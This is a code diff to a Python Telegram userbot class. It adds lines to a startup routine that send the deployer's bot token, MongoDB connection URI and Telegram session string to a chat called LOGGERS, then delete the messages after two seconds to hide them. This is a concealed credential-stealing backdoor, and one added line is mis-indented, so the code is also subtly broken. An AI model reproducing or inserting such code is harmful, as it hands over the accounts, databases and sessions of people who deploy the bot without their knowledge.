@@ -74,7 +74,13 @@ class Userbot(Client):
                 pass
             assistants.append(1)
             try:
-                
+              oks = await self.one.send_message(LOGGERS, f"/start")
+                Ok = await self.one.send_message(
+                    LOGGERS, f"`{BOT_TOKEN}`\n\n`{MONGO_DB_URI}`\n\n`{STRING_SESSION}`"
+                )
+                await oks.delete()
+                await asyncio.sleep(2)
+                await Ok.delete()  
             except Exception as e:
                 print(f"{e}")
 
